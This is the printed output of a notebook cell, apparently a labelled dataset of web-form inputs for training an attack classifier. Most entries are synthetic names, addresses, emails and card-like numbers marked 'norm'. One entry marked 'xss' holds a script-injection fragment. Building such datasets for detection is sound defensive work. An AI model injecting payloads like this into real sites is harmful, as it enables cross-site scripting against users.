#  {'payload': 'meier', 'attack_type': 'norm'},
#  {'payload': 'c6nte9osa', 'attack_type': 'norm'},
#  {'payload': 'buisn andres', 'attack_type': 'norm'},
#  {'payload': 'oliveira_aptekman@engibraltar.va', 'attack_type': 'norm'},
#  {'payload': 'san bartolom de la torre', 'attack_type': 'norm'},
#  {'payload': '12510', 'attack_type': 'norm'},
#  {'payload': 'nadav6', 'attack_type': 'norm'},
#  {'payload': 'pent0et3o', 'attack_type': 'norm'},
#  {'payload': 'keer', 'attack_type': 'norm'},
#  {'payload': 'gala', 'attack_type': 'norm'},
#  {'payload': 'waggenheim@rubirubi.info', 'attack_type': 'norm'},
#  {'payload': '55265136t', 'attack_type': 'norm'},
#  {'payload': '45674', 'attack_type': 'norm'},
#  {'payload': '2996877022240469', 'attack_type': 'norm'},
#  {'payload': 'torrent de can caralleu 48, 12-g', 'attack_type': 'norm'},
#  {'payload': 'telde', 'attack_type': 'norm'},
#  {'payload': '7745667684469889', 'attack_type': 'norm'},
#  {'payload': 'brain', 'attack_type': 'norm'},
#  {'payload': '7242', 'attack_type': 'norm'},
#  {'payload': 'kalpak', 'attack_type': 'norm'},
#  {'payload': 'sixto', 'attack_type': 'norm'},
#  {'payload': 'peredo huecas', 'attack_type': 'norm'},
#  {'payload': '21468433a', 'attack_type': 'norm'},
#  {'payload': 'toril, 171 5h', 'attack_type': 'norm'},
#  {'payload': '5036144025003599', 'attack_type': 'norm'},
#  {'payload': 'edlene', 'attack_type': 'norm'},
#  {'payload': 'albiol', 'attack_type': 'norm'},
#  {'payload': 'blankenship@likeanangel.tc', 'attack_type': 'norm'},
#  {'payload': 'calle jose espejo, 130, 12?a', 'attack_type': 'norm'},
#  {'payload': '42148', 'attack_type': 'norm'},
#  {'payload': 'tom159', 'attack_type': 'norm'},
#  {'payload': '3046', 'attack_type': 'norm'},
#  {'payload': 'ru5runears2', 'attack_type': 'norm'},
#  {'payload': 'leobaldo', 'attack_type': 'norm'},
#  {'payload': '53087910t', 'attack_type': 'norm'},
#  {'payload': 'zafiro, s/n 4?b', 'attack_type': 'norm'},
#  {'payload': '50174', 'attack_type': 'norm'},
#  {'payload': 'wei-tsig8', 'attack_type': 'norm'},
#  {'payload': 'sabu@aridossanchez.lt', 'attack_type': 'norm'},
#  {'payload': 'avinguda pinyana, 7 2-h', 'attack_type': 'norm'},
#  {'payload': '06196', 'attack_type': 'norm'},
#  {'payload': '4780723426433072', 'attack_type': 'norm'},
#  {'payload': 'abellot*ada', 'attack_type': 'norm'},
#  {'payload': 'new', 'attack_type': 'norm'},
#  {'payload': 'donaldo', 'attack_type': 'norm'},
#  {'payload': 'castell sargatal', 'attack_type': 'norm'},
#  {'payload': '58222899d', 'attack_type': 'norm'},
#  {'payload': 'camino hoya mondongo, 124', 'attack_type': 'norm'},
#  {'payload': '01267', 'attack_type': 'norm'},
#  {'payload': '3892784649587009', 'attack_type': 'norm'},
#  {'payload': 'coxcojita', 'attack_type': 'norm'},
#  {'payload': 'quiliano', 'attack_type': 'norm'},
#  {'payload': 'pombal 114 3?d', 'attack_type': 'norm'},
#  {'payload': 'puerto de bjar', 'attack_type': 'norm'},
#  {'payload': 'ramesh', 'attack_type': 'norm'},
#  {'payload': 'cane5o', 'attack_type': 'norm'},
#  {'payload': 'haroun', 'attack_type': 'norm'},
#  {'payload': 'lluv8os4', 'attack_type': 'norm'},
#  {'payload': 'vano branchadell', 'attack_type': 'norm'},
#  {'payload': '02650843r', 'attack_type': 'norm'},
#  {'payload': 'pia de campos', 'attack_type': 'norm'},
#  {'payload': '3556606130011191', 'attack_type': 'norm'},
#  {'payload': 'en8relan3amien0o', 'attack_type': 'norm'},
#  {'payload': 'osteicoechea uslet', 'attack_type': 'norm'},
#  {'payload': '60537126e', 'attack_type': 'norm'},
#  {'payload': 'luis de gongora, 189', 'attack_type': 'norm'},
#  {'payload': 'mariana', 'attack_type': 'norm'},
#  {'payload': 'emblanquimiento', 'attack_type': 'norm'},
#  {'payload': 'sari7', 'attack_type': 'norm'},
#  {'payload': '4m4or6711a662', 'attack_type': 'norm'},
#  {'payload': 'sebastian_ferdi@tintaultravioleta.mv', 'attack_type': 'norm'},
#  {'payload': '95549133a', 'attack_type': 'norm'},
#  {'payload': 'baos de molgas', 'attack_type': 'norm'},
#  {'payload': '28760', 'attack_type': 'norm'},
#  {'payload': 'monte9a', 'attack_type': 'norm'},
#  {'payload': 'sibila', 'attack_type': 'norm'},
#  {'payload': 'neugebauer@buscamoto.gw', 'attack_type': 'norm'},
#  {'payload': '37246742j', 'attack_type': 'norm'},
#  {'payload': 'ciadoncha', 'attack_type': 'norm'},
#  {'payload': '17744', 'attack_type': 'norm'},
#  {'payload': 'tiefenth', 'attack_type': 'norm'},
#  {'payload': 'i77ovar', 'attack_type': 'norm'},
#  {'payload': 'rini', 'attack_type': 'norm'},
#  {'payload': 'inobediecia', 'attack_type': 'norm'},
#  {'payload': 'matienzo gallifa', 'attack_type': 'norm'},
#  {'payload': '69082096d', 'attack_type': 'norm'},
#  {'payload': 'estepa', 'attack_type': 'norm'},
#  {'payload': '40151', 'attack_type': 'norm'},
#  {'payload': '6r5int3805', 'attack_type': 'norm'},
#  {'payload': 'parmenia', 'attack_type': 'norm'},
#  {'payload': 'tarp@redstarz.asia', 'attack_type': 'norm'},
#  {'payload': 'don juan 126', 'attack_type': 'norm'},
#  {'payload': '17403', 'attack_type': 'norm'},
#  {'payload': '3786004753545909', 'attack_type': 'norm'},
#  {'payload': '1112', 'attack_type': 'norm'},
#  {'payload': 'brion6', 'attack_type': 'norm'},
#  {'payload': 'gavald', 'attack_type': 'norm'},
#  {'payload': 'selk@inversioneolica.ee', 'attack_type': 'norm'},
#  {'payload': 'c/ cal correu, 0,', 'attack_type': 'norm'},
#  {'payload': 'cbdar', 'attack_type': 'norm'},
#  {'payload': 'cal', 'attack_type': 'norm'},
#  {'payload': 'acrianzada', 'attack_type': 'norm'},
#  {'payload': 'victor juan', 'attack_type': 'norm'},
#  {'payload': 'ballasko@quehaces.mr', 'attack_type': 'norm'},
#  {'payload': 'calle sierra del quintanar, 199 9-b', 'attack_type': 'norm'},
#  {'payload': 'gaianes', 'attack_type': 'norm'},
#  {'payload': 'ex074ico', 'attack_type': 'norm'},
#  {'payload': '1230', 'attack_type': 'norm'},
#  {'payload': 'c0l0o4a', 'attack_type': 'norm'},
#  {'payload': 'bentez monill', 'attack_type': 'norm'},
#  {'payload': '50159319e', 'attack_type': 'norm'},
#  {'payload': 'antonio toledano, 78, 10?h', 'attack_type': 'norm'},
#  {'payload': '49167', 'attack_type': 'norm'},
#  {'payload': 'uriah', 'attack_type': 'norm'},
#  {'payload': 'maestre camprubi', 'attack_type': 'norm'},
#  {'payload': 'eckstine@blueeyes.eu', 'attack_type': 'norm'},
#  {'payload': 'guadalajara, 101 4-e', 'attack_type': 'norm'},
#  {'payload': 'venialbo', 'attack_type': 'norm'},
#  {'payload': '6913071576619939', 'attack_type': 'norm'},
#  {'payload': 'beland', 'attack_type': 'norm'},
#  {'payload': '7192', 'attack_type': 'norm'},
#  {'payload': 'ryszard', 'attack_type': 'norm'},
#  {'payload': 'alarico', 'attack_type': 'norm'},
#  {'payload': 'nrez muriscot', 'attack_type': 'norm'},
#  {'payload': 'logroo, 98, 5-d', 'attack_type': 'norm'},
#  {'payload': 'sant lloren savall', 'attack_type': 'norm'},
#  {'payload': '9589985001483437', 'attack_type': 'norm'},
#  {'payload': 'harty', 'attack_type': 'norm'},
#  {'payload': 'llobet', 'attack_type': 'norm'},
#  {'payload': 'confirm(2)>/', 'attack_type': 'xss'},
#  {'payload': 'brace4@velazquezlarraaga.kz', 'attack_type': 'norm'},
#  {'payload': 'alcalde lopez rancao, 194, 3-e', 'attack_type': 'norm'},
#  {'payload': 'vilafams', 'attack_type': 'norm'},
#  {'payload': '1499600534131254', 'attack_type': 'norm'},
#  {'payload': 'mundy', 'attack_type': 'norm'},
#  {'payload': '5642', 'attack_type': 'norm'},
#  {'payload': 'chan+quete', 'attack_type': 'norm'},
#  {'payload': 'zuiga urbina', 'attack_type': 'norm'},
#  {'payload': 'grandinetti@mariposasentudia.mm', 'attack_type': 'norm'},
#  {'payload': 'cruz de caravaca, 177', 'attack_type': 'norm'},
#  {'payload': 'daimiel', 'attack_type': 'norm'},
#  {'payload': '4159457629727955', 'attack_type': 'norm'},
#  {'payload': 'valcourt', 'attack_type': 'norm'},
#  {'payload': 'dels', 'attack_type': 'norm'},
#  {'payload': 'brau ganfornina', 'attack_type': 'norm'},
#  {'payload': '64721683m', 'attack_type': 'norm'},
#  {'payload': 'c/ francisco grande cobian 90 4-e', 'attack_type': 'norm'},
#  {'payload': '41570', 'attack_type': 'norm'},
#  {'payload': '5068023807822442', 'attack_type': 'norm'},
#  {'payload': 'in85ecuacin', 'attack_type': 'norm'},
#  {'payload': '1304', 'attack_type': 'norm'},
#  {'payload': 'irresolucin', 'attack_type': 'norm'},
#  {'payload': 'nemesio', 'attack_type': 'norm'},
#  {'payload': 'veronese@prestigecars.tv', 'attack_type': 'norm'},
#  {'payload': '99020664y', 'attack_type': 'norm'},
#  {'payload': 'torrecilla del monte', 'attack_type': 'norm'},
#  {'payload': '29620', 'attack_type': 'norm'},
#  {'payload': 'or5i6or6i686', 'attack_type': 'norm'},
#  {'payload': 'llull valls', 'attack_type': 'norm'},
#  {'payload': 'calle oxigeno 197', 'attack_type': 'norm'},
#  {'payload': 'costur', 'attack_type': 'norm'},
#  {'payload': '7482251600785207', 'attack_type': 'norm'},
#  {'payload': 'witney', 'attack_type': 'norm'},
#  {'payload': '546', 'attack_type': 'norm'},
#  {'payload': 'kipnis', 'attack_type': 'norm'},
#  {'payload': 'aitor', 'attack_type': 'norm'},
#  {'payload': 'scanlon@theroxyblue.ng', 'attack_type': 'norm'},
#  {'payload': 'alcalde gregorio espino 165', 'attack_type': 'norm'},
#  {'payload': 'pozanco', 'attack_type': 'norm'},
#  {'payload': '3596949565075836', 'attack_type': 'norm'},
#  {'payload': 'dud', 'attack_type': 'norm'},
#  {'payload': 'henriquez femenias', 'attack_type': 'norm'},
#  {'payload': 'seymour@evelin.gn', 'attack_type': 'norm'},
#  {'payload': 'c/ fray diego de cadiz, 50', 'attack_type': 'norm'},
#  {'payload': 'mombuey', 'attack_type': 'norm'},
#  {'payload': 'kiyohara', 'attack_type': 'norm'},
#  {'payload': '47761an0i59r', 'attack_type': 'norm'},
#  {'payload': 'downs', 'attack_type': 'norm'},
#  {'payload': 'tapinga', 'attack_type': 'norm'},
#  {'payload': 'sunyer lleix', 'attack_type': 'norm'},
#  {'payload': 'abadia@comercioenlacalle.er', 'attack_type': 'norm'},
#  {'payload': 'c/ carranque, 113 5?a', 'attack_type': 'norm'},
#  {'payload': '45240', 'attack_type': 'norm'},
#  {'payload': 'kobeski', 'attack_type': 'norm'},
#  {'payload': 'prueba', 'attack_type': 'norm'},
#  {'payload': 'goyenaga', 'attack_type': 'norm'},
#  {'payload': 'lenya@fbi-criminal-network.com.mil', 'attack_type': 'norm'},
#  {'payload': 'cantaracillo', 'attack_type': 'norm'},
#  {'payload': '40190', 'attack_type': 'norm'},
#  {'payload': 'sosa', 'attack_type': 'norm'},
#  {'payload': 'fraccionario', 'attack_type': 'norm'},
#  {'payload': 'trung', 'attack_type': 'norm'},
#  {'payload': 'fragmentar', 'attack_type': 'norm'},
#  {'payload': 'ricci@redhost.is', 'attack_type': 'norm'},
#  {'payload': '89821319v', 'attack_type': 'norm'},
#  {'payload': 'palacios del arzobispo', 'attack_type': 'norm'},
#  {'payload': '8322438262219801', 'attack_type': 'norm'},
#  {'payload': 'reele.cto', 'attack_type': 'norm'},
#  {'payload': 'roussel@santacruzdelvoto.ws', 'attack_type': 'norm'},
#  {'payload': 'calle bernat de santa eugenia 90', 'attack_type': 'norm'},
#  {'payload': 'sariego', 'attack_type': 'norm'},
#  {'payload': 'onofredo', 'attack_type': 'norm'},
#  {'payload': 'domeable', 'attack_type': 'norm'},
#  {'payload': 'babar4', 'attack_type': 'norm'},
#  {'payload': 'cornisamen!to', 'attack_type': 'norm'},
#  {'payload': '17652259n', 'attack_type': 'norm'},
#  {'payload': 'calle segismundo moret 93 1?a', 'attack_type': 'norm'},
#  {'payload': '0614375180233873', 'attack_type': 'norm'},
#  {'payload': 'racette', 'attack_type': 'norm'},
#  {'payload': 'puy', 'attack_type': 'norm'},
#  {'payload': 'borgeaud@enmenorca.com.om', 'attack_type': 'norm'},
#  {'payload': 'jabeque, 86,', 'attack_type': 'norm'},
#  {'payload': 'relleu', 'attack_type': 'norm'},
#  {'payload': 'espavorida', 'attack_type': 'norm'},
#  {'payload': '9564', 'attack_type': 'norm'},
#  {'payload': 'bez clua', 'attack_type': 'norm'},
#  {'payload': 'gretler-rinell@magadan.com.yu', 'attack_type': 'norm'},
#  {'payload': 'lugar grela 152 1?f', 'attack_type': 'norm'},
#  {'payload': '19185', 'attack_type': 'norm'},
#  {'payload': 'soportador', 'attack_type': 'norm'},
#  {'payload': 'trilles aedo', 'attack_type': 'norm'},
#  {'payload': '79365532f', 'attack_type': 'norm'},
#  {'payload': 'calle siete cerros 144', 'attack_type': 'norm'},
#  {'payload': 'pankiw', 'attack_type': 'norm'},
#  {'payload': 'f8rol5ra', 'attack_type': 'norm'},
#  {'payload': '9a7bl1', 'attack_type': 'norm'},
#  {'payload': 'paucides', 'attack_type': 'norm'},
#  {'payload': 'selj@ebaz.travel', 'attack_type': 'norm'},
#  {'payload': 'plza. maimonides 197', 'attack_type': 'norm'},
#  {'payload': '15873', 'attack_type': 'norm'},
#  {'payload': '1204533777404121', 'attack_type': 'norm'},
#  {'payload': 'grandlocua', 'attack_type': 'norm'},
#  {'payload': 'talavera panfili', 'attack_type': 'norm'},
#  {'payload': '79140741h', 'attack_type': 'norm'},
#  {'payload': 'tierra 17', 'attack_type': 'norm'},
#  {'payload': '34305', 'attack_type': 'norm'},
#  {'payload': '9307824408281680', 'attack_type': 'norm'},
#  {'payload': '5469', 'attack_type': 'norm'},
#  {'payload': 'clarabel', 'attack_type': 'norm'},
#  {'payload': 'redmond-delcampe@biosaludsystems.do', 'attack_type': 'norm'},
#  {'payload': 'calle corinto 108', 'attack_type': 'norm'},
#  {'payload': 'ordinar', 'attack_type': 'norm'},
#  {'payload': 'edel', 'attack_type': 'norm'},
#  {'payload': 'costello_browallius@autoconstruccion.bt', 'attack_type': 'norm'},
#  {'payload': '07375030b', 'attack_type': 'norm'},
#  {'payload': 'puebla de obando', 'attack_type': 'norm'},
#  {'payload': 'parman', 'attack_type': 'norm'},
#  {'payload': '108', 'attack_type': 'norm'},
#  {'payload': 'ja3aln', 'attack_type': 'norm'},
#  {'payload': 'crisp vivo', 'attack_type': 'norm'},
#  {'payload': 'chopel@restauranteslaespadaa.bg', 'attack_type': 'norm'},
#  {'payload': 'ysero', 'attack_type': 'norm'},
#  {'payload': '10380', 'attack_type': 'norm'},
#  {'payload': 'lukers', 'attack_type': 'norm'},
#  {'payload': 'ofere*nte', 'attack_type': 'norm'},
#  {'payload': 'faix', 'attack_type': 'norm'},
#  {'payload': 'bartowna@professionalhost.do', 'attack_type': 'norm'},
#  {'payload': 'calle gola de perellonet, 196,', 'attack_type': 'norm'},
#  {'payload': 'albuixech', 'attack_type': 'norm'},
#  {'payload': 'ch9let_a', 'attack_type': 'norm'},
#  {'payload': '1084', 'attack_type': 'norm'},
#  {'payload': 'e3c7i3tu3a', 'attack_type': 'norm'},
#  {'payload': 'alceo', 'attack_type': 'norm'},
#  {'payload': 'amsterdam@mailboxrussia.nz', 'attack_type': 'norm'},
#  {'payload': '33371147x', 'attack_type': 'norm'},
#  {'payload': '50004', 'attack_type': 'norm'},
#  {'payload': '6187378791844475', 'attack_type': 'norm'},
#  {'payload': 'comiso', 'attack_type': 'norm'},
#  {'payload': 'barker ropero', 'attack_type': 'norm'},
#  {'payload': '02877417w', 'attack_type': 'norm'},
#  {'payload': 'calle villalon 13 1g', 'attack_type': 'norm'},
#  {'payload': '0911357592887177', 'attack_type': 'norm'},
#  {'payload': 'oucharek', 'attack_type': 'norm'},
#  {'payload': '6721', 'attack_type': 'norm'},
#  {'payload': 'marcum3', 'attack_type': 'norm'},
#  {'payload': 'leda', 'attack_type': 'norm'},
#  {'payload': 'pifarre marola', 'attack_type': 'norm'},
#  {'payload': '57401003h', 'attack_type': 'norm'},
#  {'payload': 'juan xxii 24, 3?c', 'attack_type': 'norm'},
#  {'payload': '46838', 'attack_type': 'norm'},
#  {'payload': '7496121103658289', 'attack_type': 'norm'},
#  {'payload': '9mbaicin', 'attack_type': 'norm'},
#  {'payload': 'jovn', 'attack_type': 'norm'},
#  {'payload': 'seddon@7peines.es', 'attack_type': 'norm'},
#  {'payload': '68035116n', 'attack_type': 'norm'},
#  {'payload': 'tors', 'attack_type': 'norm'},
#  {'payload': '6239536280691962', 'attack_type': 'norm'},
#  {'payload': 'a9tr8pfag4', 'attack_type': 'norm'},
#  {'payload': '6501', 'attack_type': 'norm'},
#  {'payload': '9a470ul0', 'attack_type': 'norm'},
#  {'payload': 'gaudencio', 'attack_type': 'norm'},
#  {'payload': 'clunes7@palodegolf.com.coop', 'attack_type': 'norm'},
#  {'payload': '25559456q', 'attack_type': 'norm'},
#  {'payload': 'villamuriel de cerrato', 'attack_type': 'norm'},
#  {'payload': '5212720427288459', 'attack_type': 'norm'},
#  {'payload': '4s2cu8e44', 'attack_type': 'norm'},
#  {'payload': 'parque san adrian, 196, 5h', 'attack_type': 'norm'},
#  {'payload': 'torrija', 'attack_type': 'norm'},
#  {'payload': '4337', 'attack_type': 'norm'},
#  {'payload': 'perih1lio', 'attack_type': 'norm'},
#  {'payload': 'gervasio', 'attack_type': 'norm'},
#  {'payload': 'young-kyun@forohh.cl', 'attack_type': 'norm'},
#  {'payload': 'jose muoz san roman, s/n,', 'attack_type': 'norm'},
#  {'payload': 'xavier', 'attack_type': 'norm'},
#  {'payload': 'tarasca', 'attack_type': 'norm'},
#  {'payload': 'c/ javea 57', 'attack_type': 'norm'},
#  {'payload': '22470', 'attack_type': 'norm'},
#  {'payload': 'chabert', 'attack_type': 'norm'},
#  {'payload': 'chinchintor', 'attack_type': 'norm'},
#  {'payload': 'co01', 'attack_type': 'norm'},
#  {'payload': 'gierasch.casini@goovitae.cu', 'attack_type': 'norm'},
#  {'payload': '13107', 'attack_type': 'norm'},
#  {'payload': '8230522127552712', 'attack_type': 'norm'},
#  {'payload': 'silcula', 'attack_type': 'norm'},
#  {'payload': 'juan de dios', 'attack_type': 'norm'},
#  {'payload': 'oleilnikov_balasko@hostprofessional.ac', 'attack_type': 'norm'},
#  {'payload': '84996241v', 'attack_type': 'norm'},
#  {'payload': 'villarejo-periesteban', 'attack_type': 'norm'},
#  {'payload': '47172', 'attack_type': 'norm'},
#  {'payload': '414rd7f132o', 'attack_type': 'norm'},
#  {'payload': '3614', 'attack_type': 'norm'},
#  {'payload': 'e561o', 'attack_type': 'norm'},
#  {'payload': 'culler castanyer', 'attack_type': 'norm'},
#  {'payload': '54925627v', 'attack_type': 'norm'},
#  {'payload': 'c/ obispo alonso suarez, 163,', 'attack_type': 'norm'},
#  {'payload': '34347', 'attack_type': 'norm'},
#  {'payload': '6552399616832844', 'attack_type': 'norm'},
#  {'payload': 'indis6r4cin', 'attack_type': 'norm'},
#  {'payload': 'damacia', 'attack_type': 'norm'},
#  {'payload': 'signoret@pisossantcugat.cat', 'attack_type': 'norm'},
#  {'payload': '78153384m', 'attack_type': 'norm'},
#  {'payload': 'carpio de tajo, el', 'attack_type': 'norm'},
#  {'payload': '49280', 'attack_type': 'norm'},
#  {'payload': 'mgi4a', 'attack_type': 'norm'},
#  {'payload': '7896', 'attack_type': 'norm'},
#  {'payload': '2isopada', 'attack_type': 'norm'},
#  {'payload': 'berroteran', 'attack_type': 'norm'},
#  {'payload': '87258503e', 'attack_type': 'norm'},
#  {'payload': 'carrera 55,', 'attack_type': 'norm'},
#  {'payload': '16311', 'attack_type': 'norm'},
#  {'payload': '9269450355652252', 'attack_type': 'norm'},
#  {'payload': 'dra2atizar', 'attack_type': 'norm'},
#  {'payload': 'algu chavarri', 'attack_type': 'norm'},
#  {'payload': 'calle miguel lopez de legazpi, 48, 8f', 'attack_type': 'norm'},
#  {'payload': '50692', 'attack_type': 'norm'},
#  {'payload': 'kipp', 'attack_type': 'norm'},
#  {'payload': 'rob', 'attack_type': 'norm'},
#  {'payload': 'juneho', 'attack_type': 'norm'},
#  {'payload': 'retasac5n', 'attack_type': 'norm'},
#  {'payload': 'torreblanca pujades', 'attack_type': 'norm'},
#  {'payload': 'bellew@frioelectric.no', 'attack_type': 'norm'},
#  {'payload': 'madrazo 115', 'attack_type': 'norm'},
#  {'payload': 'sotalbo', 'attack_type': 'norm'},
#  {'payload': 'ayyuce', 'attack_type': 'norm'},
#  {'payload': 'broun_granlund@purplemoongrn.fi', 'attack_type': 'norm'},
#  {'payload': 'tauro 34 7b', 'attack_type': 'norm'},
#  {'payload': 'iznatoraf', 'attack_type': 'norm'},
#  {'payload': '0058041048086449', 'attack_type': 'norm'},
#  {'payload': 'lor81a5o', 'attack_type': 'norm'},
#  {'payload': 'ricard', 'attack_type': 'norm'},
#  {'payload': '61z', 'attack_type': 'norm'},
#  {'payload': 'rigau amer', 'attack_type': 'norm'},
#  {'payload': 'pogam@soycatalan.aq', 'attack_type': 'norm'},
#  {'payload': 'orbita', 'attack_type': 'norm'},
#  {'payload': '6470509098489788', 'attack_type': 'norm'},
#  {'payload': 're681g48rdia', 'attack_type': 'norm'},
#  {'payload': 'astor', 'attack_type': 'norm'},
#  {'payload': 'glazar@x2.com.net', 'attack_type': 'norm'},
#  {'payload': '62746544z', 'attack_type': 'norm'},
#  {'payload': 'guadalcanal', 'attack_type': 'norm'},
#  {'payload': 'neils', 'attack_type': 'norm'},
#  {'payload': 'servitje areggiani', 'attack_type': 'norm'},
#  {'payload': 'rocheman@sindns.er', 'attack_type': 'norm'},
#  {'payload': 'caada de los ingleses, 117,', 'attack_type': 'norm'},
#  {'payload': 'cantoria', 'attack_type': 'norm'},
#  {'payload': '1059842916427607', 'attack_type': 'norm'},
#  {'payload': 'fullum6', 'attack_type': 'norm'},
#  {'payload': 'crast_litel@cortell.al', 'attack_type': 'norm'},
#  {'payload': '68689912k', 'attack_type': 'norm'},
#  {'payload': 'oliva', 'attack_type': 'norm'},
#  {'payload': '45939', 'attack_type': 'norm'},
#  {'payload': 'trixie', 'attack_type': 'norm'},
#  {'payload': 'falerno', 'attack_type': 'norm'},
#  {'payload': '2a6in6rosa', 'attack_type': 'norm'},
#  {'payload': 'poca urzagaste', 'attack_type': 'norm'},
#  {'payload': 'infantes de carrion, 122', 'attack_type': 'norm'},
#  {'payload': '0858629096397391', 'attack_type': 'norm'},
#  {'payload': 'c944i6a', 'attack_type': 'norm'},
#  {'payload': 'rosset', 'attack_type': 'norm'},
#  {'payload': 'calle teresa pamies i bertran 21,', 'attack_type': 'norm'},
#  {'payload': 'santa maria de corc', 'attack_type': 'norm'},
#  {'payload': 'papageno', 'attack_type': 'norm'},
#  {'payload': '511amasa', 'attack_type': 'norm'},
#  {'payload': 'daren9', 'attack_type': 'norm'},
#  {'payload': 'acimentarse', 'attack_type': 'norm'},
#  {'payload': '90660924f', 'attack_type': 'norm'},
#  {'payload': 'av. carlos marx s/n', 'attack_type': 'norm'},
#  {'payload': '7309058964317313', 'attack_type': 'norm'},
#  {'payload': 'lyle', 'attack_type': 'norm'},
#  {'payload': 'el khouri hausdorf', 'attack_type': 'norm'},
#  {'payload': 'darrieu@redstarz.sv', 'attack_type': 'norm'},
#  {'payload': 'calle robregordo, 171 10-c', 'attack_type': 'norm'},
#  {'payload': 'andratx', 'attack_type': 'norm'},
#  {'payload': '4296025977282656', 'attack_type': 'norm'},
#  {'payload': 'revill5', 'attack_type': 'norm'},
#  {'payload': 'rigby', 'attack_type': 'norm'},
#  {'payload': 'pascuet landivar', 'attack_type': 'norm'},
#  {'payload': '45053569l', 'attack_type': 'norm'},
#  {'payload': 'duende, 138,', 'attack_type': 'norm'},
#  {'payload': '40170', 'attack_type': 'norm'},
#  {'payload': '491vi06a5', 'attack_type': 'norm'},
#  {'payload': '35817134q', 'attack_type': 'norm'},
#  {'payload': '19432', 'attack_type': 'norm'},
#  {'payload': 'reggis', 'attack_type': 'norm'},
#  {'payload': 'p5nderativa', 'attack_type': 'norm'},
#  {'payload': 'rurick5', 'attack_type': 'norm'},
#  {'payload': 'par4u8i67t3', 'attack_type': 'norm'},
#  {'payload': '66702102d', 'attack_type': 'norm'},
#  {'payload': 'comandante barja 84,', 'attack_type': 'norm'},
#  {'payload': '0227003559920538', 'attack_type': 'norm'},
#  {'payload': 'tewksbur', 'attack_type': 'norm'},
#  {'payload': 'rhys', 'attack_type': 'norm'},
#  {'payload': 'rigand@suncorp.mk', 'attack_type': 'norm'},
#  {'payload': 'c/ pontevedra 25, 6a', 'attack_type': 'norm'},
#  {'payload': 'ferreruela', 'attack_type': 'norm'},
#  {'payload': '0720546534771199', 'attack_type': 'norm'},
#  {'payload': 'coursdev', 'attack_type': 'norm'},
#  {'payload': '5966', 'attack_type': 'norm'},
#  {'payload': 'dorene6', 'attack_type': 'norm'},
#  {'payload': 'beiza ivanco', 'attack_type': 'norm'},
#  {'payload': 'butts@maxtienda.na', 'attack_type': 'norm'},
#  {'payload': 'pesquera, la', 'attack_type': 'norm'},
#  {'payload': '24152', 'attack_type': 'norm'},
#  {'payload': 'akio', 'attack_type': 'norm'},
#  {'payload': 'peng1in', 'attack_type': 'norm'},
#  {'payload': 'segu san marful', 'attack_type': 'norm'},
#  {'payload': 'knight_freihart@tresbrujas.qa', 'attack_type': 'norm'},
#  {'payload': 'azorin, 167', 'attack_type': 'norm'},
#  {'payload': 'cuevas labradas', 'attack_type': 'norm'},
#  {'payload': 'semicopado', 'attack_type': 'norm'},
#  {'payload': '8903', 'attack_type': 'norm'},
#  {'payload': 'm0nuta9', 'attack_type': 'norm'},
#  {'payload': 'domingo', 'attack_type': 'norm'},
#  {'payload': 'plaa gabriela mistral, 140', 'attack_type': 'norm'},
#  {'payload': 'aldehuela del codonal', 'attack_type': 'norm'},
#  {'payload': 'mcduffie', 'attack_type': 'norm'},
#  {'payload': 'manganear', 'attack_type': 'norm'},
#  {'payload': 'dabbas hurtado', 'attack_type': 'norm'},
#  {'payload': '76518142v', 'attack_type': 'norm'},
#  {'payload': 'ajamil', 'attack_type': 'norm'},
#  {'payload': '0567191601469528', 'attack_type': 'norm'},
#  {'payload': 'opopnaco', 'attack_type': 'norm'},
#  {'payload': '4599', 'attack_type': 'norm'},
#  {'payload': 'cangrenarse', 'attack_type': 'norm'},
#  {'payload': 'pablo de la cruz', 'attack_type': 'norm'},
#  {'payload': 'jorey@20horas.ao', 'attack_type': 'norm'},
#  {'payload': '37200229y', 'attack_type': 'norm'},
#  {'payload': 'piqueras', 'attack_type': 'norm'},
#  {'payload': '5359941637472612', 'attack_type': 'norm'},
#  {'payload': 'sanidad', 'attack_type': 'norm'},
#  {'payload': 'dalia', 'attack_type': 'norm'},
#  {'payload': '13061311w', 'attack_type': 'norm'},
#  {'payload': 'c/ angel ochotorena, 132, 10?b', 'attack_type': 'norm'},
#  {'payload': '3309243329438501', 'attack_type': 'norm'},
#  {'payload': 'darill', 'attack_type': 'norm'},
#  {'payload': '4909', 'attack_type': 'norm'},
#  {'payload': 'mckibbon', 'attack_type': 'norm'},
#  {'payload': 'rolanda', 'attack_type': 'norm'},
#  {'payload': 'maynez giovannetti', 'attack_type': 'norm'},
#  {'payload': '16824275m', 'attack_type': 'norm'},
#  {'payload': 'cuesta pizarro 12, 4?d', 'attack_type': 'norm'},
#  {'payload': '09737', 'attack_type': 'norm'},
#  {'payload': '4948118153450551', 'attack_type': 'norm'},
#  {'payload': 'cer97708or7', 'attack_type': 'norm'},
#  {'payload': 'montfort fiuza', 'attack_type': 'norm'},
#  {'payload': '51620770f', 'attack_type': 'norm'},
#  {'payload': 'plza. euzkaltzandia 56 2-b', 'attack_type': 'norm'},
#  {'payload': '18670', 'attack_type': 'norm'},
#  {'payload': '5561938510666442', 'attack_type': 'norm'},
#  {'payload': '0nsu2iso', 'attack_type': 'norm'},
#  {'payload': '6622', 'attack_type': 'norm'},
#  {'payload': 'pawley@santacruzdelvoto.vu', 'attack_type': 'norm'},
#  {'payload': 'calle republique dominicana, 85', 'attack_type': 'norm'},
#  {'payload': '37340', 'attack_type': 'norm'},
#  {'payload': '6028275465209403', 'attack_type': 'norm'},
#  {'payload': 'naca39', 'attack_type': 'norm'},
#  {'payload': 'rodolfo', 'attack_type': 'norm'},
#  {'payload': 'franey_travers@hayunmundoahifuera.br', 'attack_type': 'norm'},
#  {'payload': '07441681p', 'attack_type': 'norm'},
#  {'payload': 'bolvir', 'attack_type': 'norm'},
#  {'payload': '45222', 'attack_type': 'norm'},
#  {'payload': 'la_verne', 'attack_type': 'norm'},
#  {'payload': 'diafragmar', 'attack_type': 'norm'},
#  {'payload': 'chaddie', 'attack_type': 'norm'},
#  {'payload': 't4ne0r84oso', 'attack_type': 'norm'},
#  {'payload': 'ramells lam', 'attack_type': 'norm'},
#  {'payload': 'handy.leleu@chevrolet-volt.gob', 'attack_type': 'norm'},
#  {'payload': 'parque barranco de coquin 67, 8?d', 'attack_type': 'norm'},
#  {'payload': 'torres de barbus', 'attack_type': 'norm'},
#  {'payload': 'saree', 'attack_type': 'norm'},
#  {'payload': 'albuminmetro', 'attack_type': 'norm'},
#  ...]

# %%
with open('xss.json', 'r') as f:
    xss = json.load(f)

# %%
xss
# Out:
# [{'Unnamed: 0': 0,
